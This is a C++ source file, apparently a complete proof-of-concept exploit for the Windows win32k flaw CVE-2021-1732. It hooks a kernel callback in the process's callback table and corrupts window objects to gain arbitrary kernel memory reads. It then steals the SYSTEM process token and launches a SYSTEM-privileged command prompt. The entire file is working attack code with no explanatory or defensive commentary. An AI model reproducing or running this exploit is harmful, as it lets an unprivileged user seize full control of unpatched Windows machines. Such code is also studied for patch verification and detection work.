#include <iostream>
#include <windows.h>
#include "CVE-2021-1732.h"

_HMValidateHandle pHmValidateHandle = NULL;
_OrigxxxClientAllocWindowClassExtraBytes pOrigxxxClientAllocWindowClassExtraBytes = NULL;
_NtUserConsoleControl pNtUserConsoleControl = NULL;
_NtCallbackReturn pNtCallbackReturn = NULL;

HMENU* hmenuNormal = new HMENU[NORMAL_WINDOW_NUMBER];
HWND* hwndNormal = new HWND[NORMAL_WINDOW_NUMBER];
HMENU* InithwndMenu = new HMENU[2];
HWND* InithwndNormal = new HWND[2];
ppWND* pWND_arr = new ppWND[NORMAL_WINDOW_NUMBER];
ULONG pWND_offset[NORMAL_WINDOW_NUMBER];

WNDCLASSEX normal_wc = { };
const WCHAR NORMAL_CLSNAME[] = L"normalClass";
const WCHAR NORMAL_WNDNAME[] = L"normalWindow";

WNDCLASSEX magic_wc = { };
const WCHAR MAGIC_CLSNAME[] = L"magicClass";
const WCHAR MAGIC_WNDNAME[] = L"MagicWindow";
HWND InithwndMagic;
HWND hwndMagic;
ppWND magicpWND;

BOOL hook_set = FALSE;
BOOL magicpWND_realloc = FALSE;

ULONGLONG orig_magicpWNDWndExtra = NULL;
ULONG magicpWNDWndExtraOffset = NULL;

int count = 0;

LRESULT CALLBACK NormalWinProc(HWND hwnd, UINT wm, WPARAM wp, LPARAM lp)
{
    return DefWindowProc(hwnd, wm, wp, lp);
}

BOOL FindHMValidateHandle()
{
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32)
    {
        printf("[!] Error while loading user32.dll: %d\n", GetLastError());
        return FALSE;
    }

    BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
    if (!pIsMenu)
    {
        printf("[!] Error getting IsMenu address: %d\n", GetLastError());
        return FALSE;
    }

    ULONG HMValidateHandleOffset = 0;
    for (ULONG i = 0; i < 0x100; i++)
    {
        BYTE* isMenuOpcode = pIsMenu + i;
        if (*isMenuOpcode == 0xe8)
        {
            HMValidateHandleOffset = i + 1;
            break;
        }
    }
    if (HMValidateHandleOffset == 0)
    {
        printf("[!] Error finding the offset to HMValidateHandle call from IsMenu\n");
        return FALSE;
    }

    ULONG relative_offset = *(PULONG)(pIsMenu + HMValidateHandleOffset);
    ULONGLONG offset = ((ULONGLONG)pIsMenu + HMValidateHandleOffset - (ULONGLONG)hUser32 + 0x04 + relative_offset) & 0x00000000ffffffff;
    pHmValidateHandle = (_HMValidateHandle)((ULONGLONG)hUser32 + offset);

    printf("[>] Relative offset to HMValidateHandle: %lx\n", relative_offset);
    printf("[>] Offset to HMValidateHandle: %llx\n", offset);
    printf("[>] VMA of HMValidateHandle: %llx\n", (ULONGLONG)pHmValidateHandle);

    return TRUE;
}

void* WINAPI MyxxxClientAllocWindowClassExtraBytes(ULONG* size)
{
    do
    {
        if (MAGIC_CBWNDEXTRA == *size)
        {
            hwndMagic = NULL;
            for (int i = 2; i < NORMAL_WINDOW_NUMBER; ++i)
            {
                DWORD cbWndExtra = pWND_arr[i]->cbWndExtra;
                if (MAGIC_CBWNDEXTRA == cbWndExtra)
                {
                    magicpWND = pWND_arr[i];
                    hwndMagic = (HWND) * (ULONG_PTR*)(magicpWND);

                    ULONGLONG uDesktopHeapBase = (ULONGLONG)pWND_arr[0] - pWND_arr[0]->dhOffset;
                    ULONGLONG pWND0WndExtraAddr = uDesktopHeapBase + pWND_arr[0]->WndExtra;
                    ULONGLONG pWND1WndExtraAddr = (ULONGLONG)pWND_arr[1] + 0x128;
                    ULONGLONG pWND1WndExtraOffset = pWND1WndExtraAddr - pWND0WndExtraAddr;
                    if (pWND1WndExtraOffset >= 0x0fffffff)
                    {
                        magicpWND_realloc = FALSE;
                    }
                    else
                    {
                        magicpWND_realloc = TRUE;
                    }
                    break;
                }
            }
            if (!hwndMagic)
            {
                break;
            }

            if (magicpWND_realloc = TRUE)
            {
                CONSOLEWINDOWOWNER magicConsoleOwner = { 0 };
                magicConsoleOwner.hwnd = hwndMagic;
                magicConsoleOwner.ProcessId = GetCurrentProcessId();
                magicConsoleOwner.ThreadId = GetCurrentThreadId();
                pNtUserConsoleControl(ConsoleAcquireDisplayOwnership, &magicConsoleOwner, sizeof(magicConsoleOwner));
                orig_magicpWNDWndExtra = magicpWND->WndExtra;
                magicpWNDWndExtraOffset = pWND_offset[0] + 0xc8;

                struct {
                    ULONG_PTR retvalue;
                    ULONG_PTR unused1;
                    ULONG_PTR unused2;
                } result = { 0 };
                result.retvalue = magicpWNDWndExtraOffset;
                pNtCallbackReturn(&result, sizeof(result), 0);
            }
            else
            {
                break;
            }
        }
    } while (FALSE);

    return pOrigxxxClientAllocWindowClassExtraBytes(size);
}

BOOL hook_alloc_window()
{
    if (hook_set == TRUE)
    {
        return TRUE;
    }

    PTEB pTEB = NtCurrentTeb();
    if (!pTEB)
    {
        printf("[!] Error while getting the TEB\n");
        return FALSE;
    }

    PPEB pPEB = pTEB->ProcessEnvironmentBlock;
    PKERNELCALLBACKTABLE KCallbackTable = (PKERNELCALLBACKTABLE)pPEB->KernelCallbackTable;
    pOrigxxxClientAllocWindowClassExtraBytes = (_OrigxxxClientAllocWindowClassExtraBytes)KCallbackTable->__xxxClientAllocWindowClassExtraBytes;

    printf("[>] Current TEB address: %p\n", pTEB);
    printf("[>] Current PEB address: %p\n", pPEB);
    printf("[>] Address of KernelCallbackTable: %p\n", KCallbackTable);
    printf("[>] Address of __xxxClientAllocWindowClassExtraBytes: %llx\n", KCallbackTable->__xxxClientAllocWindowClassExtraBytes);

    DWORD lpflOldProtect;
    if (!VirtualProtect(KCallbackTable, sizeof(KERNELCALLBACKTABLE), PAGE_READWRITE, &lpflOldProtect))
    {
        printf("[!] Error while calling VirtualProtect: %d\n", GetLastError());
        return FALSE;
    }

    KCallbackTable->__xxxClientAllocWindowClassExtraBytes = (ULONG_PTR)&MyxxxClientAllocWindowClassExtraBytes;
    if (KCallbackTable->__xxxClientAllocWindowClassExtraBytes == (ULONG_PTR)pOrigxxxClientAllocWindowClassExtraBytes)
    {
        printf("[!] Error while overwritting the __xxxClientAllocWindowClassExtraBytes callback\n");
        return FALSE;
    }
    printf("[>] __xxxClientAllocWindowClassExtraBytes successfully overwritten with: %llx\n", KCallbackTable->__xxxClientAllocWindowClassExtraBytes);
    hook_set = TRUE;

    return TRUE;
}

int reallocate_window()
{
    if (hook_set == FALSE)
    {
        normal_wc.cbSize = sizeof(WNDCLASSEX);
        normal_wc.style = CS_VREDRAW | CS_HREDRAW;
        normal_wc.lpfnWndProc = NormalWinProc;
        normal_wc.cbClsExtra = 0;
        normal_wc.cbWndExtra = NORMAL_CBWNDEXTRA;
        normal_wc.hInstance = GetModuleHandle(NULL);
        normal_wc.hIcon = NULL;
        normal_wc.hCursor = NULL;
        normal_wc.hbrBackground = NULL;
        normal_wc.lpszMenuName = NULL;
        normal_wc.lpszClassName = NORMAL_CLSNAME;
        normal_wc.hIconSm = NULL;
        if (!RegisterClassEx(&normal_wc))
        {
            printf("[!] Error while registering the normal class: %d\n", GetLastError());
            return 1;
        }

        magic_wc.cbSize = sizeof(WNDCLASSEX);
        magic_wc.style = CS_VREDRAW | CS_HREDRAW;
        magic_wc.lpfnWndProc = NormalWinProc;
        magic_wc.cbClsExtra = 0;
        magic_wc.cbWndExtra = MAGIC_CBWNDEXTRA;
        magic_wc.hInstance = GetModuleHandle(NULL);
        magic_wc.hIcon = NULL;
        magic_wc.hCursor = NULL;
        magic_wc.hbrBackground = NULL;
        magic_wc.lpszMenuName = NULL;
        magic_wc.lpszClassName = MAGIC_CLSNAME;
        magic_wc.hIconSm = NULL;
        if (!RegisterClassEx(&magic_wc))
        {
            printf("[!] Error while registering the normal class: %d\n", GetLastError());
            return 1;
        }
    }

    for (DWORD i = 0; i < 2; i++)
    {
        InithwndMenu[i] = CreateMenu();
        InithwndNormal[i] = CreateWindowEx(WS_EX_NOACTIVATE, NORMAL_CLSNAME, NORMAL_WNDNAME, WS_DISABLED, 0, 0, 0, 0, NULL, InithwndMenu[i], GetModuleHandle(NULL), NULL);
    }

    hmenuNormal[0] = CreateMenu();
    hwndNormal[0] = CreateWindowEx(WS_EX_NOACTIVATE, NORMAL_CLSNAME, NORMAL_WNDNAME, WS_DISABLED, 0, 0, 0, 0, NULL, hmenuNormal[0], GetModuleHandle(NULL), NULL);
    CONSOLEWINDOWOWNER normalConsoleOwner = { 0 };
    normalConsoleOwner.hwnd = hwndNormal[0];
    normalConsoleOwner.ProcessId = GetCurrentProcessId();
    normalConsoleOwner.ThreadId = GetCurrentThreadId();
    pNtUserConsoleControl(ConsoleAcquireDisplayOwnership, &normalConsoleOwner, sizeof(normalConsoleOwner));
    for (DWORD i = 1; i < NORMAL_WINDOW_NUMBER; i++)
    {
        hmenuNormal[i] = CreateMenu();
        hwndNormal[i] = CreateWindowEx(WS_EX_NOACTIVATE, NORMAL_CLSNAME, NORMAL_WNDNAME, WS_DISABLED, 0, 0, 0, 0, NULL, hmenuNormal[i], GetModuleHandle(NULL), NULL);
    }

    for (DWORD i = 0; i < NORMAL_WINDOW_NUMBER; i++)
    {
        pWND_arr[i] = (ppWND)pHmValidateHandle(hwndNormal[i], TYPE_WINDOW);
        pWND_offset[i] = pWND_arr[i]->dhOffset;
    }

    if (magicpWND_realloc == FALSE)
    {
        hook_alloc_window();
    }

    for (DWORD i = 2; i < NORMAL_WINDOW_NUMBER; i++)
    {
        DestroyWindow(hwndNormal[i]);
    }
    InithwndMagic = CreateWindowEx(WS_EX_NOACTIVATE, MAGIC_CLSNAME, MAGIC_WNDNAME, WS_DISABLED, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);

    return 0;
}

int main()
{
    if (!FindHMValidateHandle())
    {
        printf("[!] Error while resolving HMValidateHandle\n");
        return 1;
    }

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll)
    {
        printf("[!] Error while loading ntdll.dll: %d\n", GetLastError());
        return 1;
    }

    HMODULE hwin32u = LoadLibraryA("win32u.dll");
    if (!hwin32u)
    {
        printf("[!] Error while loading win32u.dll: %d\n", GetLastError());
        return 1;
    }

    pNtUserConsoleControl = (_NtUserConsoleControl)GetProcAddress(hwin32u, "NtUserConsoleControl");
    if (!pNtUserConsoleControl)
    {
        printf("[!] Error while resolving NtUserConsoleControl: %d\n", GetLastError());
        return 1;
    }

    pNtCallbackReturn = (_NtCallbackReturn)GetProcAddress(hNtdll, "NtCallbackReturn");
    if (!pNtCallbackReturn)
    {
        printf("[!] Error while resolving NtCallbackReturn: %d\n", GetLastError());
        return 1;
    }

    reallocate_window();
    ULONGLONG uDesktopHeapBase = (ULONGLONG)pWND_arr[0] - pWND_arr[0]->dhOffset;
    ULONGLONG pWND0WndExtraAddr = uDesktopHeapBase + pWND_arr[0]->WndExtra;
    ULONGLONG pWND1WndExtraAddr = (ULONGLONG)pWND_arr[1] + 0x128;
    ULONGLONG pWND1WndExtraOffset = pWND1WndExtraAddr - pWND0WndExtraAddr;

    while (magicpWND_realloc == FALSE)
    {
        for (DWORD i = 0; i < 2; i++)
        {
            DestroyMenu(InithwndMenu[i]);
            DestroyWindow(InithwndNormal[i]);
        }
        for (DWORD i = 1; i < NORMAL_WINDOW_NUMBER; i++)
        {
            DestroyMenu(hmenuNormal[i]);
            DestroyWindow(hwndNormal[i]);
        }
        DestroyWindow(InithwndMagic);

        //Sleep(500);
        reallocate_window();
        uDesktopHeapBase = (ULONGLONG)pWND_arr[0] - pWND_arr[0]->dhOffset;
        pWND0WndExtraAddr = uDesktopHeapBase + pWND_arr[0]->WndExtra;
        pWND1WndExtraAddr = (ULONGLONG)pWND_arr[1] + 0x128;
        pWND1WndExtraOffset = pWND1WndExtraAddr - pWND0WndExtraAddr;
    }

    printf("[>] Press ENTER to trigger the exploit!\n");
    getchar();

    printf("[>] Desktop Heap uBase Address: %llx\n", uDesktopHeapBase);
    printf("[>] pWND[0] address: %p\n", pWND_arr[0]);
    printf("[>] pWND[1] address: %p\n", pWND_arr[1]);
    printf("[>] Found magicpWND at: %p\n", magicpWND);
    printf("[>] magicpWND handle: %p\n", hwndMagic);
    printf("[>] Original magicpWND.WndExtra offset: %llx\n", orig_magicpWNDWndExtra);
    printf("[>] New magicpWND.WndExtra offset: %lx\n", magicpWNDWndExtraOffset);

    LPVOID fakespmenu = VirtualAlloc((LPVOID)0x00000001a0000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (fakespmenu == NULL)
    {
        printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
        return 1;
    }
    memset(fakespmenu, 0x00, 0x1000);
    ((PDWORD64)((DWORD64)fakespmenu + 0x98))[0] = 0x00000001a0000200;
    ((PDWORD64)((DWORD64)fakespmenu + 0x200))[0] = 0x00000001a0000300;
    ((PDWORD64)((DWORD64)fakespmenu + 0x300))[0] = 0x4545454546464646;
    ((PDWORD64)((DWORD64)fakespmenu + 0x328))[0] = 0x00000001a0000400;
    ((PDWORD64)((DWORD64)fakespmenu + 0x340))[0] = 0x0000000100000001;
    ((PDWORD64)((DWORD64)fakespmenu + 0x358))[0] = 0x00000001a0000500;
    ((PDWORD64)((DWORD64)fakespmenu + 0x428))[0] = 0x0000001000000000;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = 0x0000000000000000; // Read from this memory address

    printf("[>] Overwriting cbWndExtra of pWND[0]\n");
    ULONG  orig_magicpWNDcbWndExtra = SetWindowLong(hwndMagic, 0x0, 0x0fffffff);
    printf("[>] Changing TagWND[1] dwStyle to WS_CHILD\n");
    ULONGLONG pWND1dwStyleAddr = (ULONGLONG)pWND_arr[1] + 0x18;
    ULONGLONG pWND1dwStyleOffset = pWND1dwStyleAddr - pWND0WndExtraAddr;
    ULONGLONG  orig_pWND1dwStyle = SetWindowLongPtr(hwndNormal[0], (int)pWND1dwStyleOffset, 0x4cc0000008000100);
    printf("[>] Setting fake spmenu in pWND[1]\n");
    ULONGLONG orig_pWND1spmenu = SetWindowLongPtr(hwndNormal[1], GWLP_ID, 0x00000001a0000000);
    printf("[>] Original tagWND[1].spmenu address: %llx\n", orig_pWND1spmenu);
    printf("[>] Restoring TagWND[1] dwStyle to original\n");
    SetWindowLongPtr(hwndNormal[0], (int)pWND1dwStyleOffset, orig_pWND1dwStyle);

    MENUBARINFO mbi;
    mbi.cbSize = sizeof(MENUBARINFO);

    ULONGLONG tagWND1Obj = orig_pWND1spmenu + 0x50 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = tagWND1Obj;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    tagWND1Obj = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[>] Kernel-mode address of our tagWND[1] object: %llx\n", tagWND1Obj);

    ULONGLONG kUnknown1 = tagWND1Obj + 0x10 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kUnknown1;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    kUnknown1 = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[>] Kernel-mode address of our tagWND[1].kUnknown1: %llx\n", kUnknown1);

    ULONGLONG kThread = kUnknown1 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kThread;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    kThread = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[>] Kernel-mode address of our _KTHREAD: %llx\n", kThread);

    ULONGLONG lpEprocess = kThread + 0x220 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = lpEprocess;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    lpEprocess = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    ULONGLONG nEprocess = lpEprocess;
    printf("[>] Kernel-mode address of our _EPROCESS: %llx\n", lpEprocess);

    while (TRUE)
    {
        nEprocess = nEprocess + 0x448 - 0x48;
        ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = nEprocess;
        GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
        nEprocess = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
        nEprocess = nEprocess - 0x448;

        ULONGLONG UniqueProcessId = nEprocess + 0x440 - 0x48;
        ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
        ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = UniqueProcessId;
        GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
        UniqueProcessId = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);

        if (UniqueProcessId == 0x0000000000000004)
        {
            printf("[>] System _EPROCESS detected at: %llx\n", nEprocess);
            break;
        }
    }

    ULONGLONG sysToken = nEprocess + 0x4b8 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = sysToken;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    sysToken = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    SetWindowLongPtr(hwndNormal[0], (int)pWND1WndExtraOffset, (ULONGLONG)(lpEprocess + 0x4b8));
    ULONGLONG origToken = SetWindowLongPtr(hwndNormal[1], 0, sysToken);

    ULONGLONG kUnknown2 = tagWND1Obj + 0x18 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kUnknown2;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    kUnknown2 = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[>] Kernel-mode address of our tagWND[1].kUnknown2: %llx\n", kUnknown2);

    ULONGLONG kDesktopHeap = kUnknown2 + 0x80 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kDesktopHeap;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    kDesktopHeap = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[>] Kernel-mode address of the Desktop Heap: %llx\n", kDesktopHeap);

    SetWindowLongPtr(hwndNormal[0], (int)pWND1WndExtraOffset, (ULONGLONG)(kDesktopHeap + magicpWND->dhOffset + 0x128));
    SetWindowLong(hwndMagic, 0x0, 0x58);
    SetWindowLongPtr(hwndNormal[1], 0, orig_magicpWNDWndExtra);

    CONSOLEWINDOWOWNER pwnd1ConsoleOwner = { 0 };
    pwnd1ConsoleOwner.hwnd = hwndNormal[1];
    pwnd1ConsoleOwner.ProcessId = GetCurrentProcessId();
    pwnd1ConsoleOwner.ThreadId = GetCurrentThreadId();
    Sleep(500);

    system("start cmd.exe");
    return 0;
}